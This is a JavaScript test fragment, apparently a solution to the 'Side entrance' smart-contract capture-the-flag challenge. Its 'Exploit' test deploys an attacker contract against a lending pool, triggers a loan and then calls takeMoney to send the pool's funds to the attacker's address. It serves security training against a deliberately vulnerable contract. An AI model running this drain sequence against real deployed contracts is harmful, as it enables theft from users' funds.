...
describe("[Challenge] Side entrance", function () {
  ...
  it("Exploit", async function () {
    ...
    const LoanReceiverAttacker = await ethers.getContractFactory(
      "LoanReceiverAttacker",
      deployer
    );
    this.attackerContract = await LoanReceiverAttacker.deploy(
      this.pool.address
    );
    await this.attackerContract.connect(attacker).loan();
    await this.attackerContract.takeMoney(attacker.address);
  });
